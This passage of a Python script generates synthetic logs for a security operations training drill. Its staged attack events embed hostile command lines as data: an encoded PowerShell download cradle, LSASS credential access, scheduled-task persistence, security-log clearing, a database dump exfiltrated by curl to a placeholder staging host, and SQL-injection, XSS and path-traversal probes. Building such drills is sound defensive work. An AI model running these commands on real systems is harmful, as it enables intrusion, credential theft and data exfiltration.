    # PowerShell encoded
    t2 = DAY1.replace(hour=14, minute=47, second=8)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t2.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="RuleName">technique_id=T1059.001</Data><Data Name="UtcTime">{t2.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}</Data><Data Name="ProcessId">5832</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBkAGwALgB0AGUAYwBoAHMAdQBwAHAAbwByAHQALQBjAGQAbgAuAG4AZQB0AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnACkA</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="ParentProcessId">4120</Data><Data Name="User">NUSANTARA\\ratna.finance</Data><Data Name="Hashes">SHA256={ATTACKER["payload_hash"]}</Data></EventData></Event>')

    # File created (Event 11) - payload dropped
    t3 = DAY1.replace(hour=14, minute=47, second=25)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>11</EventID><TimeCreated SystemTime="{t3.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="UtcTime">{t3.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="TargetFilename">{ATTACKER["payload_path"]}</Data><Data Name="Hashes">SHA256={ATTACKER["payload_hash"]}</Data></EventData></Event>')

    # Network connection to C2 (Event 3)
    t4 = DAY1.replace(hour=14, minute=49)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>3</EventID><TimeCreated SystemTime="{t4.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="Image">{ATTACKER["payload_path"]}</Data><Data Name="User">NUSANTARA\\ratna.finance</Data><Data Name="SourceIp">{HOSTS["ws1"]["ip"]}</Data><Data Name="SourcePort">{rand_port()}</Data><Data Name="DestinationIp">{ATTACKER["c2"]}</Data><Data Name="DestinationPort">443</Data><Data Name="Protocol">tcp</Data></EventData></Event>')

    # LSASS access (Event 10) - Mimikatz
    t5 = DAY2.replace(hour=9, minute=15)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>10</EventID><TimeCreated SystemTime="{t5.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="RuleName">technique_id=T1003.001</Data><Data Name="SourceImage">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data><Data Name="SourceUser">NUSANTARA\\ratna.finance</Data></EventData></Event>')

    # Day 2: Discovery commands
    disc_cmds = [
        ("whoami.exe", "whoami /all"),
        ("ipconfig.exe", "ipconfig /all"),
        ("net.exe", 'net group "Domain Admins" /domain'),
        ("nltest.exe", "nltest /domain_trusts"),
        ("systeminfo.exe", "systeminfo"),
    ]
    for i, (img, cmd) in enumerate(disc_cmds):
        t = DAY2.replace(hour=9, minute=10) + timedelta(seconds=i*15)
        logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="RuleName">technique_id=T1082</Data><Data Name="ProcessId">{random.randint(6000,9999)}</Data><Data Name="Image">C:\\Windows\\System32\\{img}</Data><Data Name="CommandLine">{cmd}</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="User">NUSANTARA\\ratna.finance</Data></EventData></Event>')

    # Day 2: schtasks persistence
    t = DAY2.replace(hour=9, minute=30, second=5)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="RuleName">technique_id=T1053.005</Data><Data Name="ProcessId">{random.randint(6000,9999)}</Data><Data Name="Image">C:\\Windows\\System32\\schtasks.exe</Data><Data Name="CommandLine">schtasks /create /tn "\\Microsoft\\Windows\\Maintenance\\SystemUpdate" /tr "{ATTACKER["payload_path"]}" /sc daily /st 09:00 /ru SYSTEM</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="User">NUSANTARA\\ratna.finance</Data></EventData></Event>')

    # Day 3: wevtutil log clear
    t = DAY3.replace(hour=2, minute=40, second=5)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="ProcessId">{random.randint(6000,9999)}</Data><Data Name="Image">C:\\Windows\\System32\\wevtutil.exe</Data><Data Name="CommandLine">wevtutil cl Security</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="User">NUSANTARA\\ratna.finance</Data></EventData></Event>')

    logs.sort()
    with open(f"{OUT_DIR}/sysmon.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Sysmon: {len(logs)} events")
    return len(logs)

# ===== LINUX AUDITD =====
def gen_auditd():
    logs = []
    epoch_base = int(DAY1.timestamp())
    
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for host in ["WEB-SERVER-01", "DB-SERVER-01"]:
            # Normal cron executions
            for h in range(24):
                for m in [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55]:
                    t = day.replace(hour=h, minute=m)
                    epoch = int(t.timestamp())
                    seq = random.randint(1000, 99999)
                    cmd = random.choice(["logrotate", "monitoring.sh", "check_disk.sh", "backup.sh", "/usr/sbin/ntpd"])
                    logs.append(f'type=SYSCALL msg=audit({epoch}.{random.randint(100,999)}:{seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid={random.randint(1000,50000)} auid=4294967295 uid=0 gid=0 euid=0 comm="{cmd.split("/")[-1].split(".")[0]}" exe="/usr/bin/{cmd.split("/")[-1].split(".")[0]}" key="program_exec"')
            
            # Normal SSH admin logins (2-3/day during business hours)
            for _ in range(random.randint(2, 3)):
                t = rand_time_in_range(day.replace(hour=9), day.replace(hour=17))
                epoch = int(t.timestamp())
                seq = random.randint(1000, 99999)
                src = random.choice([HOSTS["ws1"]["ip"], HOSTS["dc"]["ip"]])
                logs.append(f'type=USER_LOGIN msg=audit({epoch}.{random.randint(100,999)}:{seq}): pid={random.randint(1000,9999)} uid=0 auid=1000 ses={random.randint(1,100)} msg=\'op=login id=1000 exe="/usr/sbin/sshd" hostname={src} addr={src} terminal=ssh res=success\'')

    # ATTACK: Day 2 09:25 - SSH from compromised WS-FINANCE-01 to DB-SERVER-01
    t = DAY2.replace(hour=9, minute=25)
    epoch = int(t.timestamp())
    logs.append(f'type=USER_LOGIN msg=audit({epoch}.456:{random.randint(1000,99999)}): pid={random.randint(1000,9999)} uid=0 auid=1000 ses=42 msg=\'op=login id=1000 exe="/usr/sbin/sshd" hostname={HOSTS["ws1"]["ip"]} addr={HOSTS["ws1"]["ip"]} terminal=ssh res=success\'')

    # ATTACK: Day 2 14:00 - mysqldump
    t = DAY2.replace(hour=14, minute=0)
    epoch = int(t.timestamp())
    seq = random.randint(1000, 99999)
    logs.append(f'type=SYSCALL msg=audit({epoch}.123:{seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 comm="mysqldump" exe="/usr/bin/mysqldump" key="program_exec"')
    logs.append(f'type=EXECVE msg=audit({epoch}.123:{seq}): argc=5 a0="mysqldump" a1="--all-databases" a2="--single-transaction" a3="-u" a4="root"')

    # ATTACK: Day 2 14:05 - tar compress
    t = DAY2.replace(hour=14, minute=5)
    epoch = int(t.timestamp())
    seq = random.randint(1000, 99999)
    logs.append(f'type=SYSCALL msg=audit({epoch}.456:{seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=5678 pid=5679 auid=1000 uid=0 gid=0 euid=0 comm="tar" exe="/usr/bin/tar" key="program_exec"')
    logs.append(f'type=EXECVE msg=audit({epoch}.456:{seq}): argc=4 a0="tar" a1="czf" a2="/tmp/bak.tar.gz" a3="/var/lib/mysql/dump.sql"')

    # ATTACK: Day 3 02:30 - curl exfil
    t = DAY3.replace(hour=2, minute=30)
    epoch = int(t.timestamp())
    seq = random.randint(1000, 99999)
    logs.append(f'type=SYSCALL msg=audit({epoch}.789:{seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=5679 pid=5680 auid=1000 uid=0 gid=0 euid=0 comm="curl" exe="/usr/bin/curl" key="program_exec"')
    logs.append(f'type=EXECVE msg=audit({epoch}.789:{seq}): argc=6 a0="curl" a1="-X" a2="POST" a3="-F" a4="file=@/tmp/bak.tar.gz" a5="https://{ATTACKER["staging"]}/upload"')

    # ATTACK: Day 3 02:35 - cleanup
    t = DAY3.replace(hour=2, minute=35)
    epoch = int(t.timestamp())
    seq = random.randint(1000, 99999)
    logs.append(f'type=SYSCALL msg=audit({epoch}.111:{seq}): arch=c000003e syscall=59 success=yes exit=0 ppid=5680 pid=5681 auid=1000 uid=0 gid=0 euid=0 comm="rm" exe="/usr/bin/rm" key="program_exec"')
    logs.append(f'type=EXECVE msg=audit({epoch}.111:{seq}): argc=3 a0="rm" a1="-f" a2="/tmp/bak.tar.gz"')

    logs.sort()
    with open(f"{OUT_DIR}/auditd.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Auditd: {len(logs)} events")
    return len(logs)

# ===== LINUX SYSLOG =====
def gen_syslog():
    logs = []
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for host in ["WEB-SERVER-01", "DB-SERVER-01"]:
            # Normal syslog entries
            for h in range(24):
                t = day.replace(hour=h, minute=random.randint(0,59))
                logs.append(f'{ts_syslog(t)} {host} systemd[1]: Started Session {random.randint(1,999)} of user root.')
                if h in [0, 6, 12, 18]:
                    logs.append(f'{ts_syslog(t)} {host} CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/local/bin/monitoring.sh)')
            
            # SSH success from admin
            for _ in range(random.randint(2, 4)):
                t = rand_time_in_range(day.replace(hour=9), day.replace(hour=17))
                src = random.choice([HOSTS["ws1"]["ip"], HOSTS["dc"]["ip"]])
                logs.append(f'{ts_syslog(t)} {host} sshd[{random.randint(1000,9999)}]: Accepted publickey for admin from {src} port {rand_port()} ssh2')

    # ATTACK: Day 2 09:25 SSH from compromised host
    t = DAY2.replace(hour=9, minute=25)
    logs.append(f'{ts_syslog(t)} DB-SERVER-01 sshd[{random.randint(1000,9999)}]: Accepted password for root from {HOSTS["ws1"]["ip"]} port {rand_port()} ssh2')

    logs.sort()
    with open(f"{OUT_DIR}/syslog.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Syslog: {len(logs)} events")
    return len(logs)

# ===== APACHE =====
def gen_apache():
    logs = []
    normal_paths = ["/", "/about", "/contact", "/products", "/services", "/login", "/api/v1/status", "/css/style.css", "/js/app.js", "/images/logo.png"]
    
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for _ in range(600):
            t = rand_time_in_range(day, day + timedelta(hours=23, minutes=59))
            src = f"{random.randint(100,200)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            path = random.choice(normal_paths)
            status = random.choice([200, 200, 200, 200, 304, 301, 404])
            size = random.randint(200, 50000)
            ua = random.choice(NORMAL_UAS)
            logs.append(f'{src} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")} +0700] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"')

    # ATTACK: Day 1 scanner probing web
    attack_paths = [
        "/admin", "/wp-login.php", "/phpmyadmin/", "/.env", "/api/../../../etc/passwd",
        "/search?q=1' OR '1'='1", "/search?q=<script>alert(1)</script>",
        "/backup.sql", "/config.php.bak", "/.git/config",
    ]
    for path in attack_paths:
        t = DAY1.replace(hour=9, minute=17) + timedelta(seconds=random.randint(0,180))
        ua = "Mozilla/5.0 (compatible; Nikto)"
        status = 404 if "admin" in path or "wp-" in path else 400
        logs.append(f'{ATTACKER["scanner"]} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")} +0700] "GET {path} HTTP/1.1" {status} {random.randint(200,500)} "-" "{ua}"')

    logs.sort()
    with open(f"{OUT_DIR}/apache_access.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Apache: {len(logs)} events")
    return len(logs)

# ─── MAIN ───────────────────────────────────────────────
if __name__ == "__main__":
    print("Generating SOC Cyber Drill logs...")
    total = 0
    total += gen_firewall()
    total += gen_dns()
    total += gen_suricata()
    total += gen_windows()
    total += gen_sysmon()
    total += gen_auditd()
    total += gen_syslog()
    total += gen_apache()
    print(f"\n✅ Total: {total} events generated in {OUT_DIR}/")
    print("Files:")
    for f in sorted(os.listdir(OUT_DIR)):
        size = os.path.getsize(f"{OUT_DIR}/{f}")
        print(f"  {f}: {size/1024:.0f} KB")
